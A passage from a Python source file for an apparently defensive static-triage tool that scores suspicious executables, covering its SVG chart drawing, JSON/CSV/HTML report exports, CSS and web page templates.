        bits = [f"{p.get('bits')}-bit {p.get('type')}", p.get("machine", "")]
        if p.get("static"):
            bits.append("static")
        if p.get("stripped"):
            bits.append("stripped")
        return ", ".join(b for b in bits if b)
    if res["format"] == "PE" and p.get("ok"):
        bits = [p.get("machine", ""), p.get("subsystem", ""),
                "DLL" if p.get("dll") else "executable"]
        if p.get("imports"):
            bits.append(f"{len(p['imports'])} imported module(s)")
        return ", ".join(b for b in bits if b)
    if res["format"] == "Mach-O" and p.get("ok"):
        return ", ".join(str(x) for x in (p.get("cputype"), p.get("filetype"),
                                          "universal" if p.get("universal") else "") if x)
    if res["format"] == "script":
        return "script with a shebang"
    return res["format"]


# =============================================================================
# SECTION 6 - Charts (hand-drawn SVG: no CDN, no JS charting library, offline)
# =============================================================================

def svg_pie(items, size=200, title="Indicators by severity", fmt=lambda v: f"{v:g}"):
    items = [(l, float(v), c) for (l, v, c) in items if v and v > 0]
    total = sum(v for _, v, _ in items)
    if total <= 0:
        return f'<div class="chart-empty">{html_escape(title)}: nothing to show</div>'
    cx = cy = size / 2
    r_out, r_in = size / 2 - 10, size / 2 - 46
    parts, legend, angle = [], [], -90.0
    for label, value, color in items:
        sweep = 360.0 * value / total
        if abs(sweep - 360.0) < 1e-9:
            parts.append(f'<circle cx="{cx}" cy="{cy}" r="{(r_out + r_in) / 2:.2f}" fill="none" '
                         f'stroke="{color}" stroke-width="{r_out - r_in:.2f}"/>')
        else:
            a0, a1 = math.radians(angle), math.radians(angle + sweep)
            x0, y0 = cx + r_out * math.cos(a0), cy + r_out * math.sin(a0)
            x1, y1 = cx + r_out * math.cos(a1), cy + r_out * math.sin(a1)
            x2, y2 = cx + r_in * math.cos(a1), cy + r_in * math.sin(a1)
            x3, y3 = cx + r_in * math.cos(a0), cy + r_in * math.sin(a0)
            lg = 1 if sweep > 180 else 0
            parts.append(f'<path d="M {x0:.2f} {y0:.2f} A {r_out:.2f} {r_out:.2f} 0 {lg} 1 '
                         f'{x1:.2f} {y1:.2f} L {x2:.2f} {y2:.2f} A {r_in:.2f} {r_in:.2f} 0 '
                         f'{lg} 0 {x3:.2f} {y3:.2f} Z" fill="{color}">'
                         f'<title>{html_escape(label)}: {html_escape(fmt(value))}</title></path>')
        angle += sweep
        legend.append(f'<div class="lg"><i style="background:{color}"></i>'
                      f'<span>{html_escape(label)}</span><b>{html_escape(fmt(value))}</b>'
                      f'<em>{100.0 * value / total:.0f}%</em></div>')
    return (f'<figure class="chart"><figcaption>{html_escape(title)}</figcaption>'
            f'<div class="chart-row"><svg viewBox="0 0 {size} {size}" width="{size}" '
            f'height="{size}" role="img" aria-label="{html_escape(title)}">{"".join(parts)}'
            f'<text x="{cx}" y="{cy + 5}" text-anchor="middle" class="pie-n">'
            f'{html_escape(fmt(total))}</text></svg>'
            f'<div class="legend">{"".join(legend)}</div></div></figure>')


def svg_bar(items, width=440, title="By indicator", color="#e5484d",
            fmt=lambda v: f"{v:g}", colors=None):
    items = [(str(l), float(v or 0)) for l, v in items]
    if not items or all(v <= 0 for _, v in items):
        return f'<div class="chart-empty">{html_escape(title)}: nothing to show</div>'
    row_h, gap, pad_l, pad_t = 23, 8, 178, 8
    height = pad_t * 2 + len(items) * (row_h + gap)
    mx = max(v for _, v in items) or 1
    bw = width - pad_l - 62
    rows = []
    for i, (label, value) in enumerate(items):
        y = pad_t + i * (row_h + gap)
        w = max(2.0, bw * value / mx)
        c = (colors or {}).get(label, color)
        lbl = label if len(label) <= 24 else label[:23] + "\u2026"
        rows.append(
            f'<text x="{pad_l - 10}" y="{y + row_h * 0.7:.1f}" text-anchor="end" class="bl">'
            f'{html_escape(lbl)}</text>'
            f'<rect x="{pad_l}" y="{y}" width="{bw}" height="{row_h}" rx="4" class="btrack"/>'
            f'<rect x="{pad_l}" y="{y}" width="{w:.1f}" height="{row_h}" rx="4" fill="{c}">'
            f'<title>{html_escape(label)}: {html_escape(fmt(value))}</title></rect>'
            f'<text x="{pad_l + bw + 8:.1f}" y="{y + row_h * 0.7:.1f}" class="bv">'
            f'{html_escape(fmt(value))}</text>')
    return (f'<figure class="chart"><figcaption>{html_escape(title)}</figcaption>'
            f'<svg viewBox="0 0 {width} {height}" width="{width}" height="{height}" role="img" '
            f'aria-label="{html_escape(title)}">{"".join(rows)}</svg></figure>')


def svg_scatter(points, width=470, height=230,
                title="Entropy against attention score"):
    """Each dot is a file: entropy on x, attention score on y. Packed and
    encrypted files drift right; the ones worth reading first sit high."""
    points = [p for p in points if p.get("entropy") is not None]
    if not points:
        return f'<div class="chart-empty">{html_escape(title)}: nothing to show</div>'
    pad_l, pad_b, pad_t, pad_r = 40, 30, 14, 12
    pw, ph = width - pad_l - pad_r, height - pad_t - pad_b
    grid = []
    for f in (0, 0.25, 0.5, 0.75, 1.0):
        y = pad_t + ph - ph * f
        grid.append(f'<line x1="{pad_l}" y1="{y:.1f}" x2="{width - pad_r}" y2="{y:.1f}" '
                    f'class="gl"/><text x="{pad_l - 6}" y="{y + 4:.1f}" text-anchor="end" '
                    f'class="bl">{100 * f:g}</text>')
        x = pad_l + pw * f
        grid.append(f'<text x="{x:.1f}" y="{height - 10}" text-anchor="middle" class="bl">'
                    f'{8 * f:g}</text>')
    dots = []
    for p in points[:600]:
        x = pad_l + pw * clamp(float(p["entropy"]) / 8.0, 0, 1)
        y = pad_t + ph - ph * clamp(float(p["score"]) / 100.0, 0, 1)
        colour = priority_of(p["score"])[1]
        dots.append(f'<circle cx="{x:.1f}" cy="{y:.1f}" r="3.6" fill="{colour}" '
                    f'fill-opacity="0.75"><title>{html_escape(p["name"])}: entropy '
                    f'{p["entropy"]}, score {p["score"]}</title></circle>')
    return (f'<figure class="chart"><figcaption>{html_escape(title)} &middot; '
            f'entropy across, attention up</figcaption>'
            f'<svg viewBox="0 0 {width} {height}" width="{width}" height="{height}" '
            f'role="img" aria-label="{html_escape(title)}">{"".join(grid)}'
            f'{"".join(dots)}</svg></figure>')


def svg_gauge(score, label, size=150):
    colour = priority_of(score)[1]
    r = size / 2 - 13
    cx = cy = size / 2
    circ = 2 * math.pi * r
    return (f'<svg viewBox="0 0 {size} {size}" width="{size}" height="{size}" role="img" '
            f'aria-label="Highest attention score {score} of 100, {label}">'
            f'<circle cx="{cx}" cy="{cy}" r="{r:.1f}" fill="none" stroke="#262a33" '
            f'stroke-width="12"/>'
            f'<circle cx="{cx}" cy="{cy}" r="{r:.1f}" fill="none" stroke="{colour}" '
            f'stroke-width="12" stroke-linecap="round" '
            f'stroke-dasharray="{circ * clamp(score, 0, 100) / 100:.2f} {circ:.2f}" '
            f'transform="rotate(-90 {cx} {cy})"/>'
            f'<text x="{cx}" y="{cy + 4}" text-anchor="middle" class="g-n" fill="{colour}">'
            f'{score:g}</text>'
            f'<text x="{cx}" y="{cy + 22}" text-anchor="middle" class="g-l">top</text></svg>')


# =============================================================================
# SECTION 7 - Exports
# =============================================================================

def report_payload(scan_id=None, conn=None) -> dict:
    own = conn is None
    conn = conn or connect()
    try:
        sid = scan_id or latest_scan_id(conn)
        scan = scan_summary(sid, conn) if sid else None
        files = [dict(r) for r in q("SELECT * FROM files WHERE scan_id=? ORDER BY score DESC, "
                                    "path", (sid,), conn)] if sid else []
        inds = {}
        for r in q("SELECT * FROM indicators WHERE scan_id=?", (sid,), conn) if sid else []:
            inds.setdefault(r["file_id"], []).append(dict(r))
        for f in files:
            f["indicators"] = inds.get(f["id"], [])
        return {
            "tool": APP_NAME, "version": VERSION, "author": AUTHOR,
            "generated_at": now_iso(), "disclaimer": DISCLAIMER_LONG,
            "not_antivirus": (
                "This is NOT antivirus output. There is no signature database, no sandbox "
                "and no reputation lookup. Scores are a triage priority for human review. "
                "A high score does not mean malicious; a low score does not mean safe."),
            "next_steps": (
                "Do not delete anything. Note the SHA-256, check it against a reputation "
                "service yourself, and follow your own incident process. This tool "
                "deliberately uploads nothing."),
            "scan": scan, "files": files,
            "baseline": [dict(r) for r in q("SELECT * FROM baseline ORDER BY approved_at DESC",
                                            (), conn)],
            "scans": [dict(r) for r in q("SELECT id,ts,paths,scanned,files_flagged,top_score "
                                         "FROM scans ORDER BY id DESC LIMIT 50", (), conn)],
        }
    finally:
        if own:
            conn.close()


def export_json(scan_id=None) -> str:
    return json.dumps(report_payload(scan_id), indent=2, default=str)


def export_csv(scan_id=None) -> str:
    conn = connect()
    try:
        sid = scan_id or latest_scan_id(conn)
        buf = io.StringIO()
        w = csv.writer(buf, lineterminator="\n")
        w.writerow([f"# {APP_NAME} v{VERSION} by {AUTHOR}"])
        w.writerow([f"# scan_id={sid} generated={now_iso()}"])
        w.writerow([f"# {DISCLAIMER_SHORT}"])
        w.writerow(["# Scores are a triage priority, NOT a verdict. Do not delete anything."])
        w.writerow(["score", "priority", "path", "format", "size", "sha256", "entropy",
                    "indicators", "critical", "high", "medium", "low", "owner_package",
                    "mode", "mtime", "summary", "error"])
        for r in q("SELECT * FROM files WHERE scan_id=? ORDER BY score DESC", (sid,), conn):
            w.writerow([r[k] for k in ("score", "priority", "path", "format", "size",
                                       "sha256", "entropy", "indicator_count", "critical",
                                       "high", "medium", "low", "owner_package", "mode",
                                       "mtime", "summary", "error")])
        return buf.getvalue()
    finally:
        conn.close()


def export_html(scan_id=None) -> str:
    conn = connect()
    try:
        p = report_payload(scan_id, conn)
        scan, esc = p["scan"], html_escape
        if not scan:
            return "<!doctype html><html><body><h1>No scans recorded</h1></body></html>"
        counts = {s: scan[s] or 0 for s in SEVERITIES}
        pie = svg_pie([(s, counts[s], SEV_COLOR[s]) for s in SEVERITIES])
        by_code = {}
        by_fmt = {}
        for f in p["files"]:
            by_fmt[f["format"]] = by_fmt.get(f["format"], 0) + 1
            for i in f["indicators"]:
                if i["severity"] != "info":
                    by_code[i["title"][:40]] = by_code.get(i["title"][:40], 0) + 1
        bar = svg_bar(sorted(by_code.items(), key=lambda x: -x[1])[:12],
                      title="Most common indicators")
        barf = svg_bar(sorted(by_fmt.items(), key=lambda x: -x[1]), title="Files by format",
                       color="#5b8def", colors=FORMAT_COLOR)
        scat = svg_scatter([{"name": os.path.basename(f["path"]), "entropy": f["entropy"],
                             "score": f["score"]} for f in p["files"]])
        flagged = [f for f in p["files"] if f["score"] >= 15]
        frows = ""
        for f in flagged[:60]:
            irows = "".join(
                f'<div class="ind"><span class="pill" '
                f'style="background:{SEV_COLOR.get(i["severity"], "#888")}">'
                f'{esc(i["severity"].upper())}</span> <b>{esc(i["title"])}</b>'
                f'<div class="desc">{esc(i["detail"])}</div>'
                + (f'<pre>{esc(i["evidence"])}</pre>' if i["evidence"] else "")
                + (f'<div class="benign"><b>When this is normal:</b> {esc(i["benign"])}</div>'
                   if i["benign"] else "") + "</div>"
                for i in sorted(f["indicators"],
                                key=lambda x: SEVERITIES.index(x["severity"])))
            frows += (f'<tr><td class="num"><b style="color:'
                      f'{priority_of(f["score"])[1]}">{f["score"]}</b><div class="sub2">'
                      f'{esc(f["priority"])}</div></td>'
                      f'<td><b>{esc(f["path"])}</b>'
                      f'<div class="sub2">{esc(f["format"])} &middot; '
                      f'{esc(fmt_bytes(f["size"]))} &middot; entropy {f["entropy"]} &middot; '
                      f'{esc(f["summary"] or "")}</div>'
                      f'<div class="mono sub2">SHA-256 {esc(f["sha256"] or "-")}</div>'
                      f'{irows}</td></tr>')
        return f"""<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{APP_SHORT} report - {esc(scan['hostname'] or '')}</title><style>
 body{{font:14px/1.55 ui-sans-serif,system-ui,'Segoe UI',Roboto,sans-serif;margin:0;
      background:#0f1115;color:#e6e8ee}}
 .wrap{{max-width:1120px;margin:0 auto;padding:28px 20px 60px}}
 h1{{font-size:22px;margin:0 0 4px}} .meta{{color:#8b8f9b;font-size:12.5px}}
 h2{{font-size:12px;text-transform:uppercase;letter-spacing:.15em;color:#8b8f9b;
     margin:32px 0 12px;border-bottom:1px solid #262a33;padding-bottom:8px}}
 .grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:18px 0}}
 .card{{background:#171a21;border:1px solid #262a33;border-radius:10px;padding:12px 14px}}
 .card .n{{font-size:23px;font-weight:700;font-family:ui-monospace,monospace}}
 .card .l{{font-size:10.5px;text-transform:uppercase;letter-spacing:.11em;color:#8b8f9b}}
 table{{width:100%;border-collapse:collapse;background:#171a21;border:1px solid #262a33;
        border-radius:10px;overflow:hidden;font-size:13px}}
 th{{text-align:left;font-size:10.5px;letter-spacing:.11em;text-transform:uppercase;
     color:#8b8f9b;padding:10px 12px;border-bottom:1px solid #262a33;background:#1c2029}}
 td{{padding:10px 12px;border-bottom:1px solid #1e222a;vertical-align:top}}
 .mono{{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;word-break:break-all}}
 .num{{font-family:ui-monospace,monospace;text-align:center;width:74px}}
 .sub2{{color:#8b8f9b;font-size:11.5px}}
 .pill{{color:#0f1115;font-weight:700;font-size:10px;padding:2px 8px;border-radius:20px}}
 .ind{{margin-top:10px;padding:8px 10px;background:#12151b;border:1px solid #262a33;
       border-radius:8px}}
 .desc{{color:#b6bac4;margin-top:4px;max-width:78ch}}
 .benign{{margin-top:5px;color:#8fd3b0;font-size:12.3px;max-width:78ch}}
 pre{{background:#0f1115;border:1px solid #262a33;border-radius:6px;padding:7px;
      font-family:ui-monospace,monospace;font-size:11.5px;margin:6px 0 0;overflow:auto;
      white-space:pre-wrap;word-break:break-all;color:#b6bac4;max-height:140px}}
 .warn{{background:#231a12;border:1px solid #5a3b1c;color:#ffcf9e;padding:12px 14px;
        border-radius:10px;font-size:12.5px;margin:16px 0;white-space:pre-wrap}}
 .stop{{background:#2a1216;border:1px solid #6b2229;color:#ffc9cd;padding:12px 14px;
        border-radius:10px;font-size:12.5px;margin:14px 0}}
 .note{{background:#12202a;border:1px solid #1c4a5e;color:#a8d8e8;padding:11px 14px;
        border-radius:10px;font-size:12.5px;margin:14px 0}}
 .charts{{display:flex;gap:20px;flex-wrap:wrap;align-items:flex-start}}
 .chart{{margin:0;background:#171a21;border:1px solid #262a33;border-radius:10px;padding:14px 16px}}
 .chart figcaption{{font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;
   color:#8b8f9b;margin-bottom:10px;font-family:ui-monospace,monospace}}
 .chart-row{{display:flex;gap:16px;align-items:center;flex-wrap:wrap}}
 .chart-empty{{background:#171a21;border:1px dashed #31363f;border-radius:10px;padding:18px;
   color:#8b8f9b;font-size:12.5px}}
 .legend{{display:flex;flex-direction:column;gap:6px;min-width:150px}}
 .lg{{display:flex;align-items:center;gap:7px;font-size:12.5px}}
 .lg i{{width:11px;height:11px;border-radius:3px}} .lg span{{flex:1}}
 .lg em{{font-style:normal;color:#8b8f9b;font-size:11px}}
 text.bl{{fill:#8b8f9b;font:11px ui-monospace,monospace}}
 text.bv{{fill:#e6e8ee;font:11px ui-monospace,monospace}}
 rect.btrack{{fill:#1e222a}} line.gl{{stroke:#262a33;stroke-width:1}}
 text.pie-n{{fill:#e6e8ee;font:700 17px ui-monospace,monospace}}
 text.g-n{{font:700 26px ui-monospace,monospace}}
 text.g-l{{fill:#8b8f9b;font:10px ui-monospace,monospace}}
 footer{{margin-top:36px;color:#6f7685;font-size:12px;border-top:1px solid #262a33;padding-top:14px}}
</style></head><body><div class="wrap">
<h1>{APP_NAME} - triage report</h1>
<div class="meta">{esc(scan['hostname'])} &middot; {esc(scan['os_version'] or '')} &middot;
 {ts_pretty(scan['ts'])} &middot; paths {esc(scan['paths'])} &middot;
 {scan['scanned']} file(s) examined in {scan['duration_ms']} ms</div>
<div class="warn">{esc(DISCLAIMER_LONG)}</div>
<div class="stop"><b>Before you act on anything below:</b> {esc(p['next_steps'])}</div>
<div class="note"><b>{esc(p['not_antivirus'])}</b></div>
<div class="charts">{svg_gauge(scan['top_score'] or 0, '')}
 <div><div style="font-size:24px;font-weight:700">
 {esc(priority_of(scan['top_score'] or 0)[0])}</div>
 <div class="meta">{scan['files_flagged']} of {scan['scanned']} file(s) scored at or above
 the review threshold</div></div></div>
<div class="grid">
{"".join(f'<div class="card"><div class="l">{s}</div><div class="n" '
         f'style="color:{SEV_COLOR[s]}">{counts[s]}</div></div>' for s in SEVERITIES)}
 <div class="card"><div class="l">Examined</div><div class="n">{scan['scanned']}</div></div>
</div>
<h2>Analytics</h2><div class="charts">{pie}{barf}</div>
<div class="charts" style="margin-top:16px">{bar}{scat}</div>
<h2>Files worth reviewing ({len(flagged)})</h2>
{'<table><tr><th>Score</th><th>File and indicators</th></tr>' + frows + '</table>'
 if frows else '<div class="chart-empty">No file reached the review threshold. That is not '
 'a clean bill of health - it means nothing stood out to these checks.</div>'}
<footer>Generated by {APP_NAME} v{VERSION} &middot; {AUTHOR} &middot; {GITHUB}<br>
 Scores order what to look at first. They are not verdicts, and most high scores on a healthy
 machine have ordinary explanations - which is why every indicator above states when it is
 normal.</footer></div></body></html>"""
    finally:
        conn.close()


# =============================================================================
# SECTION 8 - Web application (5 pages, no CDN, no JavaScript libraries)
# =============================================================================

CSS = """
:root{--bg:#0f1115;--panel:#171a21;--panel-2:#1c2029;--line:#262a33;--line-2:#31363f;
 --tx:#e6e8ee;--tx-dim:#8b8f9b;--tx-mid:#b6bac4;--accent:#e5484d;--ok:#30a46c;
 --warn:#ffb224;--good:#8fd3b0;
 --mono:ui-monospace,SFMono-Regular,'JetBrains Mono',Menlo,Consolas,'Courier New',monospace;}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--tx);
 font:14px/1.55 ui-sans-serif,system-ui,-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
header.top{border-bottom:1px solid var(--line);background:var(--panel);position:sticky;top:0;z-index:9}
.hd{max-width:1220px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;gap:16px;
 flex-wrap:wrap}
.brand{font-family:var(--mono);font-weight:700;letter-spacing:-.4px;font-size:15px}
.brand b{color:var(--accent)}
.brand small{display:block;font-weight:400;font-size:10.5px;letter-spacing:.14em;
 text-transform:uppercase;color:var(--tx-dim)}
nav{display:flex;gap:2px;margin-left:auto;flex-wrap:wrap}
nav a{font-family:var(--mono);font-size:12px;letter-spacing:.06em;text-transform:uppercase;
 padding:7px 11px;border-radius:6px;color:var(--tx-dim)}
nav a:hover{background:var(--panel-2);color:var(--tx);text-decoration:none}
nav a.on{background:var(--accent);color:#0b0d10;font-weight:600}
.wrap{max-width:1220px;margin:0 auto;padding:20px 20px 70px}
.banner{background:#231a12;border:1px solid #5a3b1c;color:#ffcf9e;padding:10px 14px;
 border-radius:9px;font-size:12.3px;margin-bottom:12px;line-height:1.5}
.banner.stop{background:#2a1216;border-color:#6b2229;color:#ffc9cd}
.banner.info{background:#12202a;border-color:#1c4a5e;color:#a8d8e8}
.banner b{color:#fff}
h1{font-size:19px;margin:0 0 3px;letter-spacing:-.3px}
h2{font-family:var(--mono);font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;
 color:var(--tx-dim);margin:26px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--line)}
.sub{color:var(--tx-dim);font-size:12.5px;margin-bottom:14px}
.sub2{color:var(--tx-dim);font-size:11.5px}
.bar{display:flex;gap:9px;align-items:center;flex-wrap:wrap;margin:0 0 16px}
.btn{font-family:var(--mono);font-size:12px;padding:8px 13px;border-radius:7px;cursor:pointer;
 border:1px solid var(--line-2);background:var(--panel-2);color:var(--tx);display:inline-block}
.btn:hover{border-color:var(--accent);text-decoration:none}
.btn.primary{background:var(--accent);border-color:var(--accent);color:#fff;font-weight:700}
.btn.tiny{padding:3px 8px;font-size:10.5px}
select,input[type=text],input[type=number]{font-family:var(--mono);font-size:12px;padding:7px 9px;
 background:var(--panel-2);color:var(--tx);border:1px solid var(--line-2);border-radius:7px}
input[type=text]{min-width:240px}
label.chk{font-family:var(--mono);font-size:12px;color:var(--tx-dim);display:flex;gap:5px;
 align-items:center}
.grid{display:grid;gap:12px;grid-template-columns:repeat(auto-fit,minmax(136px,1fr));margin:14px 0}
.card{background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:14px 16px}
.card .l{font-family:var(--mono);font-size:10.5px;letter-spacing:.13em;text-transform:uppercase;
 color:var(--tx-dim)}
.card .n{font-size:24px;font-weight:700;line-height:1.3;font-family:var(--mono)}
.card .s{font-size:11.5px;color:var(--tx-dim)}
.hero{display:flex;gap:22px;align-items:center;flex-wrap:wrap;background:var(--panel);
 border:1px solid var(--line);border-radius:12px;padding:16px 20px}
.hero .meta{flex:1;min-width:250px}
.kv{display:grid;grid-template-columns:auto 1fr;gap:3px 14px;font-size:12.5px}
.kv dt{color:var(--tx-dim);font-family:var(--mono);font-size:11px;letter-spacing:.07em;
 text-transform:uppercase}
.kv dd{margin:0;word-break:break-word}
table{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);
 border-radius:11px;overflow:hidden;font-size:13px}
th{text-align:left;font-family:var(--mono);font-size:10.5px;letter-spacing:.12em;
 text-transform:uppercase;color:var(--tx-dim);padding:10px 12px;border-bottom:1px solid var(--line);
 background:var(--panel-2);white-space:nowrap}
td{padding:10px 12px;border-bottom:1px solid #1e222a;vertical-align:top}
tr:last-child td{border-bottom:none} tr:hover td{background:#1b1f27}
.mono{font-family:var(--mono);font-size:11.5px;word-break:break-all}
.num{font-family:var(--mono);font-size:12px;text-align:center}
.pill{display:inline-block;color:#0b0d10;font-weight:700;font-size:10px;padding:2px 8px;
 border-radius:20px;letter-spacing:.06em;font-family:var(--mono);white-space:nowrap}
.tag{display:inline-block;font-family:var(--mono);font-size:10.5px;padding:1px 6px;border-radius:5px;
 border:1px solid var(--line-2);color:var(--tx-dim);white-space:nowrap}
.tag.good{border-color:#1e5138;color:#7fd9ab}
.ind{margin-top:9px;padding:8px 10px;background:#12151b;border:1px solid var(--line);
 border-radius:8px}
.desc{color:var(--tx-mid);margin-top:4px;max-width:80ch}
.benign{margin-top:5px;color:var(--good);font-size:12.3px;max-width:80ch}
pre{background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:7px 9px;
 font-family:var(--mono);font-size:11.5px;margin:6px 0 0;max-height:150px;overflow:auto;
 white-space:pre-wrap;word-break:break-all;color:var(--tx-mid)}
details summary{cursor:pointer;color:var(--tx-dim);font-size:12px;font-family:var(--mono)}
.charts{display:flex;gap:18px;flex-wrap:wrap;align-items:flex-start}
.chart{margin:0;background:var(--panel);border:1px solid var(--line);border-radius:11px;
 padding:14px 16px}
.chart figcaption{font-family:var(--mono);font-size:10.5px;letter-spacing:.13em;
 text-transform:uppercase;color:var(--tx-dim);margin-bottom:10px}
.chart-row{display:flex;gap:16px;align-items:center;flex-wrap:wrap}
.chart-empty{background:var(--panel);border:1px dashed var(--line-2);border-radius:11px;
 padding:20px;color:var(--tx-dim);font-size:12.5px;flex:1;min-width:250px}
.legend{display:flex;flex-direction:column;gap:6px;min-width:150px}
.lg{display:flex;align-items:center;gap:7px;font-size:12.5px}
.lg i{width:11px;height:11px;border-radius:3px;flex:none}
.lg span{flex:1} .lg b{font-family:var(--mono)}
.lg em{font-style:normal;color:var(--tx-dim);font-family:var(--mono);font-size:11px}
text.bl{fill:#8b8f9b;font:11px var(--mono)} text.bv{fill:#e6e8ee;font:11px var(--mono)}
rect.btrack{fill:#1e222a} line.gl{stroke:#262a33;stroke-width:1}
text.pie-n{fill:#e6e8ee;font:700 17px var(--mono)}
text.g-n{font:700 26px var(--mono)} text.g-l{fill:#8b8f9b;font:10px var(--mono)}
.empty{background:var(--panel);border:1px dashed var(--line-2);border-radius:11px;padding:28px;
 text-align:center;color:var(--tx-dim)}
.empty b{display:block;color:var(--tx);margin-bottom:6px;font-size:15px}
footer{max-width:1220px;margin:0 auto;padding:16px 20px 40px;color:#6f7685;font-size:11.5px;
 border-top:1px solid var(--line);line-height:1.7}
.lvl-ERROR{color:var(--accent)} .lvl-WARN{color:var(--warn)} .lvl-INFO{color:var(--tx-dim)}
@media (max-width:640px){.hd{padding:10px 14px} .wrap{padding:14px 14px 50px}
 nav{margin-left:0;width:100%} .card .n{font-size:20px} table{font-size:12.2px}
 th,td{padding:8px 9px} input[type=text]{min-width:150px}}
"""

BASE_TPL = """<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{{ page }} - """ + APP_SHORT + """</title><style>""" + CSS + """</style></head><body>
<header class="top"><div class="hd">
 <div class="brand"><b>SUSPEX</b> Suspicious Executable Detector
  <small>static triage &middot; never executes anything</small></div>
 <nav>
  <a href="{{ url_for('page_overview') }}" class="{{ 'on' if nav=='overview' }}">Overview</a>
  <a href="{{ url_for('page_files') }}" class="{{ 'on' if nav=='files' }}">Files</a>
  <a href="{{ url_for('page_indicators') }}" class="{{ 'on' if nav=='indicators' }}">Indicators</a>
  <a href="{{ url_for('page_analytics') }}" class="{{ 'on' if nav=='analytics' }}">Analytics</a>
  <a href="{{ url_for('page_logs') }}" class="{{ 'on' if nav=='logs' }}">Logs</a>
 </nav></div></header>
<div class="wrap">
 <div class="banner"><b>Authorised use only.</b> """ + DISCLAIMER_SHORT + """</div>
 {% if error %}<div class="banner stop"><b>That failed:</b> {{ error }}</div>{% endif %}
 {% if flash %}<div class="banner info">{{ flash }}</div>{% endif %}
 {% block body %}{% endblock %}
</div>
<footer>""" + APP_NAME + """ v""" + VERSION + """ &middot; built by """ + AUTHOR + """ &middot;
 <a href=\"""" + GITHUB + """\" rel="noopener">GitHub</a> &middot;
 <a href=\"""" + LINKEDIN + """\" rel="noopener">LinkedIn</a><br>
 <b>Not antivirus.</b> No signatures, no sandbox, no reputation lookup, no network request.
 Scores order what to read first - a high score is not a verdict and a low score is not a
 clean bill of health.<br>
 Never delete a file on the strength of this report. Note the hash, verify it yourself, and
 follow your own incident process.</footer>
</body></html>"""

CONTROLS_TPL = """
<div class="bar">
 <form method="post" action="{{ url_for('do_scan') }}" style="display:flex;gap:8px;
  flex-wrap:wrap;align-items:center">
  <input type="text" name="paths" placeholder="paths to scan, space separated"
   value="{{ last_paths or default_paths }}">
  <label class="chk"><input type="checkbox" name="quick" value="1"> quick (skip strings)
  </label>
  <label class="chk"><input type="checkbox" name="all_files" value="1"> every file, not just
   executables</label>
  <button class="btn primary" type="submit">Scan</button></form>
 {% if scan %}
 <form method="get" style="display:flex;gap:8px;align-items:center">
  <label class="mono" style="color:var(--tx-dim)">SCAN</label>
  <select name="scan" onchange="this.form.submit()">
   {% for s in all_scans %}<option value="{{ s.id }}" {{ 'selected' if s.id==scan.id }}>
    #{{ s.id }} &middot; {{ s.ts[:16].replace('T',' ') }} &middot; {{ s.scanned }} files
   </option>{% endfor %}</select></form>
 <a class="btn" href="{{ url_for('export', fmt='html') }}?scan={{ scan.id }}">Export HTML</a>
 <a class="btn" href="{{ url_for('export', fmt='json') }}?scan={{ scan.id }}">JSON</a>
 <a class="btn" href="{{ url_for('export', fmt='csv') }}?scan={{ scan.id }}">CSV</a>
 {% endif %}
</div>"""

EMPTY_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Overview</h1>
""" + CONTROLS_TPL + """
<div class="empty"><b>No scans yet</b>
 Point it at a directory. It reads every candidate file as data, parses the executable
 headers, and orders what came back by how much it deserves a human's attention. It never
 runs anything it examines.
 <div class="mono" style="margin-top:12px;color:var(--tx-dim)">
  from the terminal: python3 suspicious_executable_detector.py scan --path /tmp<br>
  one file in detail: python3 suspicious_executable_detector.py inspect /path/to/file</div>
</div>{% endblock %}"""

OVERVIEW_TPL = """{% extends 'base.html' %}{% block body %}
<h1>Overview</h1>
<div class="sub">Scan #{{ scan.id }} of {{ scan.hostname }} &middot; {{ ts_pretty(scan.ts) }}
 &middot; {{ scan.scanned }} file(s) examined in {{ scan.duration_ms }} ms</div>
""" + CONTROLS_TPL + """
<div class="banner stop"><b>Before acting on anything here:</b> do not delete it. Note the
 SHA-256, check it against a reputation service yourself, and follow your incident process.
 This tool uploads nothing - submitting a file can disclose confidential data and, during a
 targeted intrusion, tips off the attacker.</div>
<div class="hero">
 {{ gauge|safe }}
 <div class="meta"><dl class="kv">
  <dt>Highest</dt><dd><b>{{ priority_of(scan.top_score)[0] }}</b> -
   {{ scan.files_flagged }} of {{ scan.scanned }} file(s) at or above the review threshold</dd>
  <dt>Paths</dt><dd class="mono">{{ scan.paths }}</dd>
  <dt>Coverage</dt><dd>{{ scan.considered }} file(s) considered, {{ scan.scanned }} examined
   {% if scan.dirs_denied %}&middot; <span class="tag">{{ scan.dirs_denied }} directory(ies)
   unreadable</span>{% endif %}
   {% if scan.hit_limit %}&middot; <span class="tag" style="border-color:#5a3b1c">
   stopped at the file limit - this scan is incomplete</span>{% endif %}</dd>
  <dt>Mode</dt><dd>{{ 'quick (strings skipped)' if scan.quick else 'full' }},
   {{ 'every file' if scan.all_files else 'executables only' }},
   {{ 'recursive' if scan.recursive else 'top level only' }}</dd>
 </dl></div>
</div>
<div class="grid">
{% for s in severities %}
 <div class="card"><div class="l">{{ s }}</div>
  <div class="n" style="color:{{ sev[s] }}">{{ scan[s] }}</div></div>
{% endfor %}
 <div class="card"><div class="l">Examined</div><div class="n">{{ scan.scanned }}</div></div>
</div>
<h2>Worth reviewing first</h2>
{% if rows %}
<table><tr><th>Score</th><th>File and indicators</th></tr>
{% for f in rows %}
<tr><td class="num"><b style="color:{{ priority_of(f.score)[1] }}">{{ f.score }}</b>
 <div class="sub2">{{ f.priority }}</div></td>
 <td><b>{{ f.path }}</b>
